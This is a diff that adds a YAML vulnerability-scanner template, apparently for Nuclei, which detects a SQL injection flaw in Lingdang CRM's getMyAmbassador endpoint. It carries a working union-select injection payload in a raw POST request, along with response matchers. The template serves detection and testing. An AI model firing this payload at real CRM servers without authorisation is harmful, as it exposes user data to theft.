@@ -1,0 +1,41 @@
+id: poc-yaml-51mis-crm-getmyambassador-sqli
+info:
+  name: Lingdang CRM getMyAmbassador SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in the `getMyAmbassador` functionality of Lingdang CRM.
+    The issue allows an attacker to inject SQL payloads, potentially exposing sensitive information.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        logincrm_userid=-1 union select {{t2}},2,3#
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"last_name":'
+          - '"crm_user_id":'
+        part: body
+      - type: word
+        words:
+          - '{{t2}}'
+        part: body
+      - type: word
+        words:
+          - '<'
+        part: body
+        negative: true
